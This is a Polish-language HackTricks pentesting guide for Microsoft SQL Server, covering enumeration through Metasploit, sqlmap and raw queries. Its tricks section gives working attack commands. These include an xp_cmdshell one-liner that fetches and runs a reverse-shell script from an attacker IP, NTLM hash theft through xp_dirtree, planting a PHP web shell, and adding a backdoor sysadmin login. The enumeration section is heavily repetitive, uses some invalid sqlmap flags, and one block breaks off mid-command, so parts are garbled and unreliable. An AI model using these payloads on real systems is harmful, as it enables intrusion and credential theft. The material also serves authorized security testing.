# 1433 - Pentesting MSSQL - Microsoft SQL Server

<details>

<summary><strong>Naucz siƒô hakowaƒá AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siƒô swoimi sztuczkami hakerskimi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajd≈∫ najwa≈ºniejsze podatno≈õci, aby m√≥c je szybko naprawiƒá. Intruder ≈õledzi powierzchniƒô ataku, wykonuje proaktywne skanowanie zagro≈ºe≈Ñ, znajduje problemy w ca≈Çym stosie technologicznym, od interfejs√≥w API po aplikacje internetowe i systemy chmurowe. [**Wypr√≥buj za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ju≈º dzi≈õ.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Podstawowe informacje

Z [wikipedia](https://en.wikipedia.org/wiki/Microsoft\_SQL\_Server):

> **Microsoft SQL Server** to system zarzƒÖdzania **bazƒÖ danych relacyjnych** opracowany przez firmƒô Microsoft. Jako serwer baz danych jest to produkt oprogramowania, kt√≥rego g≈Ç√≥wnƒÖ funkcjƒÖ jest przechowywanie i pobieranie danych zgodnie z ≈ºƒÖdaniami innych aplikacji oprogramowania - kt√≥re mogƒÖ dzia≈Çaƒá zar√≥wno na tym samym komputerze, jak i na innym komputerze w sieci (w tym w Internecie).\

**Domy≈õlny port:** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### **Domy≈õlne tabele systemowe MS-SQL**

* **Baza danych master**: Ta baza danych jest kluczowa, poniewa≈º przechowuje wszystkie szczeg√≥≈Çy na poziomie systemu dla instancji serwera SQL.
* **Baza danych msdb**: Serwer SQL Agent wykorzystuje tƒô bazƒô danych do zarzƒÖdzania harmonogramem alert√≥w i zada≈Ñ.
* **Baza danych model**: S≈Çu≈ºy jako wzorzec dla ka≈ºdej nowej bazy danych na instancji serwera SQL, gdzie wszelkie zmiany, takie jak rozmiar, por√≥wnywanie, model odzyskiwania i inne, sƒÖ odzwierciedlane w nowo utworzonych bazach danych.
* **Baza danych Resource**: Baza danych tylko do odczytu, kt√≥ra zawiera obiekty systemowe dostarczane wraz z serwerem SQL. Te obiekty, choƒá przechowywane fizycznie w bazie danych Resource, sƒÖ logicznie prezentowane w schemacie sys ka≈ºdej bazy danych.
* **Baza danych tempdb**: S≈Çu≈ºy jako tymczasowe miejsce przechowywania obiekt√≥w tymczasowych lub po≈õrednich zestaw√≥w wynik√≥w.


## Wyliczanie

### Automatyczne wyliczanie

Je≈õli nie wiesz nic o us≈Çudze:
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
{% hint style="info" %}
Je≈õli **nie masz** **po≈õwiadcze≈Ñ**, mo≈ºesz spr√≥bowaƒá je odgadnƒÖƒá. Mo≈ºesz u≈ºyƒá nmap lub metasploit. BƒÖd≈∫ ostro≈ºny, mo≈ºesz **zablokowaƒá konta**, je≈õli nie uda ci siƒô zalogowaƒá kilka razy, u≈ºywajƒÖc istniejƒÖcej nazwy u≈ºytkownika.
{% endhint %}

#### Metasploit (wymaga po≈õwiadcze≈Ñ)
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**Atak si≈Çowy**](../../generic-methodologies-and-resources/brute-force.md#sql-server)

### Rƒôczne wyliczanie

#### Logowanie
```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### Powszechne wyliczanie

##### Wyliczanie instancji MSSQL

Aby rozpoczƒÖƒá proces pentestingu MSSQL, pierwszym krokiem jest wyliczenie instancji MSSQL dzia≈ÇajƒÖcych na docelowym systemie. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `nmap`, `Metasploit` lub `SQLPing3`.

```plaintext
nmap -p 1433 --script ms-sql-info <adres_IP_docelowego_systemu>
```

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <adres_IP_docelowego_systemu>
run
```

```plaintext
SQLPing3.exe -s <adres_IP_docelowego_systemu>
```

##### Wyliczanie baz danych

Po zidentyfikowaniu dzia≈ÇajƒÖcych instancji MSSQL, kolejnym krokiem jest wyliczenie dostƒôpnych baz danych. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_enum
set RHOSTS <adres_IP_docelowego_systemu>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --dbs
```

```plaintext
SELECT name FROM sys.databases
```

##### Wyliczanie kont u≈ºytkownik√≥w

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá konta u≈ºytkownik√≥w w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_hashdump
set RHOSTS <adres_IP_docelowego_systemu>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --users
```

```plaintext
SELECT name FROM sys.syslogins
```

##### Wyliczanie uprawnie≈Ñ u≈ºytkownik√≥w

Po zidentyfikowaniu kont u≈ºytkownik√≥w, mo≈ºna wyliczyƒá ich uprawnienia w celu znalezienia potencjalnych s≈Çabych punkt√≥w. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --users --passwords
```

```plaintext
SELECT name, permission_name FROM sys.database_principals
```

##### Wyliczanie informacji o tabelach

Po zidentyfikowaniu baz danych i kont u≈ºytkownik√≥w, mo≈ºna wyliczyƒá informacje o tabelach w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych>
```

```plaintext
SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'
```

##### Wyliczanie informacji o kolumnach

Po zidentyfikowaniu tabel, mo≈ºna wyliczyƒá informacje o kolumnach w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --columns -D <nazwa_bazy_danych> -T <nazwa_tabeli>
```

```plaintext
SELECT column_name FROM information_schema.columns WHERE table_name = '<nazwa_tabeli>'
```

##### Wyliczanie informacji o widokach

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o widokach w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych> --sql-query "SELECT name FROM sys.views"
```

```plaintext
SELECT table_name FROM information_schema.views WHERE table_catalog = '<nazwa_bazy_danych>'
```

##### Wyliczanie informacji o procedurach sk≈Çadowanych

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o procedurach sk≈Çadowanych w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych> --sql-query "SELECT name FROM sys.procedures"
```

```plaintext
SELECT name FROM sys.procedures WHERE type = 'P'
```

##### Wyliczanie informacji o funkcjach skalaranych

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o funkcjach skalaranych w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych> --sql-query "SELECT name FROM sys.objects WHERE type = 'FN'"
```

```plaintext
SELECT name FROM sys.objects WHERE type = 'FN'
```

##### Wyliczanie informacji o funkcjach skalaranych CLR

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o funkcjach skalaranych CLR w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych> --sql-query "SELECT name FROM sys.assembly_modules"
```

```plaintext
SELECT name FROM sys.assembly_modules
```

##### Wyliczanie informacji o funkcjach agregujƒÖcych

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o funkcjach agregujƒÖcych w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych> --sql-query "SELECT name FROM sys.objects WHERE type = 'AF'"
```

```plaintext
SELECT name FROM sys.objects WHERE type = 'AF'
```

##### Wyliczanie informacji o typach danych u≈ºytkownika

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o typach danych u≈ºytkownika w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych> --sql-query "SELECT name FROM sys.types WHERE is_user_defined = 1"
```

```plaintext
SELECT name FROM sys.types WHERE is_user_defined = 1
```

##### Wyliczanie informacji o kluczach obcych

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o kluczach obcych w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych> --sql-query "SELECT name FROM sys.foreign_keys"
```

```plaintext
SELECT name FROM sys.foreign_keys
```

##### Wyliczanie informacji o indeksach

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o indeksach w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych> --sql-query "SELECT name FROM sys.indexes"
```

```plaintext
SELECT name FROM sys.indexes
```

##### Wyliczanie informacji o wyzwalaczach

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o wyzwalaczach w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych> --sql-query "SELECT name FROM sys.triggers"
```

```plaintext
SELECT name FROM sys.triggers
```

##### Wyliczanie informacji o sekwencjach

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o sekwencjach w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych> --sql-query "SELECT name FROM sys.sequences"
```

```plaintext
SELECT name FROM sys.sequences
```

##### Wyliczanie informacji o schematach

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o schematach w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_schemadump
set RHOSTS <adres_IP_docelowego_systemu>
set USERNAME <nazwa_u≈ºytkownika>
set PASSWORD <has≈Ço_u≈ºytkownika>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --tables -D <nazwa_bazy_danych> --sql-query "SELECT name FROM sys.schemas"
```

```plaintext
SELECT name FROM sys.schemas
```

##### Wyliczanie informacji o funkcjach CLR

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o funkcjach CLR w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_enum_clr
set RHOSTS <adres_IP_docelowego_systemu>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --clr
```

```plaintext
SELECT name FROM sys.assemblies
```

##### Wyliczanie informacji o funkcjach rozszerzalnych

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o funkcjach rozszerzalnych w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_enum_ext
set RHOSTS <adres_IP_docelowego_systemu>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --ext
```

```plaintext
SELECT name FROM sys.assembly_modules WHERE assembly_id IN (SELECT assembly_id FROM sys.assemblies WHERE is_user_defined = 1)
```

##### Wyliczanie informacji o funkcjach agregujƒÖcych CLR

Po zidentyfikowaniu baz danych, mo≈ºna wyliczyƒá informacje o funkcjach agregujƒÖcych CLR w celu dalszego ataku. Mo≈ºna to zrobiƒá za pomocƒÖ narzƒôdzi takich jak `Metasploit`, `SQLMap` lub `SQL Server Management Studio (SSMS)`.

```plaintext
msfconsole
use auxiliary/scanner/mssql/mssql_enum_agg
set RHOSTS <adres_IP_docelowego_systemu>
run
```

```plaintext
sqlmap -u "jdbc:sqlserver://<adres_IP_docelowego_systemu>:1433" --
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```
#### Pobierz u≈ºytkownika

{% content-ref url="types-of-mssql-users.md" %}
[types-of-mssql-users.md](types-of-mssql-users.md)
{% endcontent-ref %}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### Uzyskiwanie uprawnie≈Ñ

1. **Element zabezpieczony:** Zdefiniowany jako zasoby zarzƒÖdzane przez SQL Server w celu kontroli dostƒôpu. SƒÖ one kategoryzowane jako:
- **Serwer** - Przyk≈Çady to bazy danych, logowania, punkty ko≈Ñcowe, grupy dostƒôpno≈õci i role serwera.
- **Baza danych** - Przyk≈Çady obejmujƒÖ role bazy danych, role aplikacji, schemat, certyfikaty, katalogi pe≈Çnotekstowe i u≈ºytkownik√≥w.
- **Schemat** - Obejmuje tabele, widoki, procedury, funkcje, synonimy itp.

2. **Uprawnienie:** PowiƒÖzane z elementami zabezpieczonymi SQL Servera, uprawnienia takie jak ALTER, CONTROL i CREATE mogƒÖ byƒá udzielane podmiotowi. ZarzƒÖdzanie uprawnieniami odbywa siƒô na dw√≥ch poziomach:
- Na poziomie **serwera** za pomocƒÖ logowa≈Ñ
- Na poziomie **bazy danych** za pomocƒÖ u≈ºytkownik√≥w

3. **Podmiot:** Termin ten odnosi siƒô do podmiotu, kt√≥remu udzielane sƒÖ uprawnienia do elementu zabezpieczonego. Podmioty obejmujƒÖ g≈Ç√≥wnie logowania i u≈ºytkownik√≥w bazy danych. Kontrola dostƒôpu do element√≥w zabezpieczonych odbywa siƒô poprzez udzielanie lub odmawianie uprawnie≈Ñ lub poprzez uwzglƒôdnienie logowa≈Ñ i u≈ºytkownik√≥w w rolach wyposa≈ºonych w prawa dostƒôpu.
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## Sztuczki

### Wykonaj polecenia systemowe

{% hint style="danger" %}
Nale≈ºy pamiƒôtaƒá, ≈ºe aby m√≥c wykonywaƒá polecenia, nie tylko konieczne jest w≈ÇƒÖczenie **`xp_cmdshell`**, ale r√≥wnie≈º posiadanie **uprawnienia EXECUTE do procedury sk≈Çadowanej `xp_cmdshell`**. Mo≈ºna sprawdziƒá, kto (opr√≥cz sysadmin√≥w) mo≈ºe u≈ºywaƒá **`xp_cmdshell`** za pomocƒÖ:
```sql
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
{% endhint %}
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' ‚Äî
```
### Kradzie≈º hasha NetNTLM / Atak przekierowania

Nale≈ºy uruchomiƒá serwer **SMB**, aby przechwyciƒá u≈ºywany w uwierzytelnianiu hash (`impacket-smbserver` lub `responder` na przyk≈Çad).
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
{% hint style="warning" %}
Mo≈ºesz sprawdziƒá, kto (opr√≥cz sysadmin√≥w) ma uprawnienia do uruchamiania tych funkcji MSSQL, u≈ºywajƒÖc:
```sql
Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```
{% endhint %}

Za pomocƒÖ narzƒôdzi takich jak **responder** lub **Inveigh** mo≈ºna **ukra≈õƒá hasz NetNTLM**.\
Mo≈ºesz zobaczyƒá, jak u≈ºywaƒá tych narzƒôdzi w:

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### Wykorzystywanie zaufanych link√≥w MSSQL

[**Przeczytaj ten post**](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md) **aby dowiedzieƒá siƒô wiƒôcej na temat wykorzystywania tej funkcji:**

{% content-ref url="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md" %}
[abusing-ad-mssql.md](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md)
{% endcontent-ref %}

### **Zapisywanie plik√≥w**

Aby zapisaƒá pliki za pomocƒÖ `MSSQL`, musimy **w≈ÇƒÖczyƒá** [**Procedury automatyzacji Ole**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), co wymaga uprawnie≈Ñ administratora, a nastƒôpnie wykonaƒá niekt√≥re procedury sk≈Çadowane w celu utworzenia pliku:
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **Odczytaj plik za pomocƒÖ** OPENROWSET

Domy≈õlnie, `MSSQL` umo≈ºliwia odczyt plik√≥w z dowolnego miejsca w systemie operacyjnym, do kt√≥rego konto ma dostƒôp do odczytu. Mo≈ºemy u≈ºyƒá nastƒôpujƒÖcego zapytania SQL:
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
Jednak opcja **`BULK`** wymaga uprawnienia **`ADMINISTER BULK OPERATIONS`** lub **`ADMINISTER DATABASE BULK OPERATIONS`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### Wektor oparty na b≈Çƒôdach do SQLi:

```sql
SELECT 1/0 FROM table_name
```

This error-based vector is used to identify SQL injection vulnerabilities in Microsoft SQL Server. By dividing 1 by 0, an error is triggered if the vulnerability exists. If an error is returned, it indicates that the SQL injection vulnerability is present.

To exploit this vulnerability, an attacker can modify the payload to extract sensitive information from the database or perform other malicious actions.

